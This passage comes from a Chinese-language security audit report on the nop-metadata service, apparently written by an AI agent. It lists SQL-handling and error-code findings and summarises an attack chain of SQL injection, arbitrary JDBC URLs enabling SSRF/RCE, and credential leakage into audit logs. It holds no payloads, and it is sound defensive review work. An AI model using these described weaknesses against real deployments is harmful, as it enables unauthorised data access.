- **现状**: 同一个 executor 内有两条风格——`judgeRange/judgeRegex` 用 PreparedStatement 绑定 min/max/pattern；`queryLong/queryTimestamp/querySingleValue` 用 Statement。`querySingleValue` 尤其严重，因为它执行的是 custom_sql 规则的用户 SQL（已在 [维度13-03] 标注），多语句注入风险与 [AR-01] 的 schemaPattern 注入互相放大。
- **风险**:
  - 风格不一致让审计/review 难以快速判断"这条路径是否安全"。
  - custom_sql 路径若启用 `allowMultiQueries`（MySQL 连接串常带），Statement.executeQuery 可能执行多语句。
- **建议**: 至少给 `queryLong`/`queryTimestamp` 改为 PreparedStatement（即使无参数），统一风格；custom_sql 路径单独评估（已知显式风险，但需配合 [AR-02] 的连接白名单）。
- **信心水平**: 很可能
- **发现来源视角**: 模型攻击者 + 死代码清道夫
- **复核状态**: 已保留

---

### [AR-13] NopException 构造时 ErrorCode params `{sql, error}` 仅设置 sql，error 缺失

- **文件**:
  - `nop-metadata/nop-metadata-service/src/main/java/io/nop/metadata/service/quality/MetaQualityRuleExecutor.java:463-466`（queryLong catch 块）
  - 同文件 `477-480`（queryTimestamp catch 块）
  - 同文件 `539-541` 附近类似模式（如有）
- **证据片段**:
  ```java
  } catch (SQLException e) {
      throw new NopException(ErrorCode.define("metadata.quality-sql-failed",
              "Quality rule SQL execution failed: {sql} -- {error}", "sql", "error"), e)
              .param("sql", sql);
              // 缺 .param("error", messageOf(e))
  }
  ```
- **严重程度**: P3
- **现状**: ErrorCode 描述含 `{error}` 占位符但 throw 时只设置 `sql`。最终用户看到的错误消息里 `{error}` 为空或保留占位符字面量。
- **风险**:
  - 错误响应信息不全，运维难以诊断 SQL 失败原因。
  - ErrorCode.params 是 i18n 字典 key 的一部分，缺失会让前端 i18n 匹配失败。
- **建议**: 添加 `.param("error", messageOf(e))`，与同模块其他 catch 块（如 `NopMetaTableBizModel:814`）保持一致。
- **信心水平**: 确定
- **发现来源视角**: 异常路径侦探
- **复核状态**: 已保留

---

### [AR-14] collectCatalogForTable 错误码与参数语义不匹配（疑似复制粘贴 bug）

- **文件**: `nop-metadata/nop-metadata-service/src/main/java/io/nop/metadata/service/entity/NopMetaDataSourceBizModel.java:307-314`
- **证据片段**:
  ```java
  @BizMutation
  public Map<String, Object> collectCatalogForTable(@Name("metaTableId") String metaTableId, ...) {
      IEntityDao<NopMetaTable> tableDao = daoFor(NopMetaTable.class);
      NopMetaTable table = tableDao.getEntityById(metaTableId);
      if (table == null) {
          throw new NopException(ERR_DATASOURCE_NOT_FOUND).param("dataSourceId", metaTableId);
          // ^ ErrorCode 是 "DataSource not found: {dataSourceId}"，但参数是 metaTableId
      }
      ...
  }
  ```
  与 [维度09-11] 报告的 NopMetaDataSourceBizModel:307-314 是同一处 —— **复查现状**：本次审计在 live code 中确认此 bug **仍然存在，未被修复**。
- **严重程度**: P2（已知未修复）
- **现状**: 与多维度审计 [维度09-11] 描述完全一致，本条为 **状态确认**：
  - 调用 `collectCatalogForTable(metaTableId="abc")`，metaTableId 不存在时返回错误 "DataSource not found: dataSourceId=abc"。
  - 用户拿错误响应去查"哪个数据源出问题"，但实际是表 ID 不存在。
  - 与 [维度09-11] 不同的是：本次审计注意到 **同模块还有同模式 bug 待复核**——见 `NopMetaTableBizModel.resolveExternalTableOrThrow` 等其他处。
- **风险**: 未修复，与 [维度09-11] 描述一致。
- **建议**: 优先修复（机械替换），新增 `ERR_TABLE_NOT_FOUND` ErrorCode。
- **信心水平**: 确定
- **发现来源视角**: 异常路径侦探（复核多维度审计 [维度09-11]）
- **复核状态**: 已保留（标注"已知未修复"）

---

## 总评

### 本模块当前最值得关注的 1-3 个方向

1. **SchemaPattern SQL 注入家族（[AR-01]）+ JDBC URL 完全无防护（[AR-02]）+ querySpace 路由劫持（[AR-03]）—— 共同构成"任何能创建数据源/规则的低权限用户可越权读任意 DB 数据"的攻击链。** 多维度审计识别了 `custom_sql` 单点风险，但漏掉了 schemaPattern 这一系统性漏洞（3 个执行器 6 个 judge 方法均影响）和 connectionConfig + 任意 JDBC URL 组合带来的 SSRF/RCE 攻击面。这是本模块最值得立即修复的方向。

2. **跨库 in-memory 合并的 SQL 语义错误（[AR-05]）+ OFFSET/LIMIT 语法错误（[AR-04]）—— "看似正确、实际不对" 的两类静默错误。** 前者在 NULL key / 类型错配时静默返回错误结果（聚合 SUM/COUNT 错误），后者在 MySQL + offset-only 分页时静默失败。两者都不会触发显式 ErrorCode，但产出错误数据，对 BI/质量规则场景破坏性大。

3. **审计事件的快照泄露（[AR-07]）+ before/after 相同（[AR-06]）+ 内存膨胀 DoS（[AR-09]）—— "可观测性基础设施自己产生新风险"。** 多维度审计已经识别 connectionConfig 通过 GraphQL 暴露（[维度13-01]），但本审计额外发现事件流路径会把同一份凭据 **重复落盘**（每次 sync 都在事件行的 before+after 各放一份），且 NopMetaModelChangedEvent 通常长期保留——凭据轮换后旧密码仍在 audit 表里可读。

### 本次审查的盲区自评

- **未跑实际测试**：未执行 `./mvnw test -pl nop-metadata -am`，未用真实 MySQL 实例验证 OFFSET-without-LIMIT bug 的具体失败模式。建议在落地修复前先跑一次集成测试。
- **未深挖 codegen 模板的元数据安全性**：本次审查聚焦 service 层；`/nop/templates/orm` 等平台模板可能引入额外的注入面（如生成的 _app.orm.xml 是否包含可疑列）。
- **未审查 amis view.yaml 前端逻辑**：多维度审计 [维度13-01] 已发现 `connectionConfig` 在列表页可见，但本次未审计前端 picker/main/lib 等深度交互——可能有更多敏感字段在前端被回显。
- **未对照 GraphQL schema 完整 diff**：未跑 GraphQL introspection 验证哪些字段实际对外可达。多维度审计 [维度03-01] 指出 `I*Biz` 接口为空 → 跨模块调用会失败，但未验证 GraphQL 引擎是否仍通过 BizModel 反射暴露所有 public 方法。
- **未追踪 nop-metadata-app 启动行为**：未跑过 Quarkus 启动，未验证 `metaQualityCheckpointScheduler` 在生产环境的 `@PostConstruct` 行为是否符合预期（特别是 nop-job 未启用时的降级）。
- **未审计 nop-metadata-web 的页面权限**：仅检查 data-auth.xml 为空（多维度审计 [维度13-02] 已识别），未审计每个页面的 amis wire 是否泄露敏感字段。
- **未对照 design/ 目录下的设计文档**：架构基线多处被代码引用（§2.7.1 D3、§2.8 D3、§4.4.2 D6/D7、§4.4.3 D1-D5 等），本次审查未回查原始设计文档，可能漏掉"代码偏离设计"类问题。
- **未评估 custom_sql 规则的审计需求**：[维度13-03] 已识别 custom_sql 风险，本次审查未深挖"哪些角色应被允许创建 custom_sql 规则"的业务策略问题。

### 按严重程度分布表

| 严重程度 | 数量 | 主要类别 |
|---------|------|---------|
| P0      | 2    | schemaPattern SQL 注入家族 / JDBC URL 完全无防护 |
| P1      | 5    | OFFSET-without-LIMIT / cross-DB NULL 语义 / connectionConfig 二次落盘 / 内存膨胀 DoS / querySpace 路由劫持 |
| P2      | 5    | syncExternalTables 事件 before==after / Math.toIntExact 溢出 / N+1 upsert / evalExpectPassWhen NFE / 错误码语义错配（已知未修复） |
| P3      | 2    | Statement vs PreparedStatement 风格不一 / ErrorCode.param 缺失 |

---

<AI_STEP_RESULT>issues</AI_STEP_RESULT>
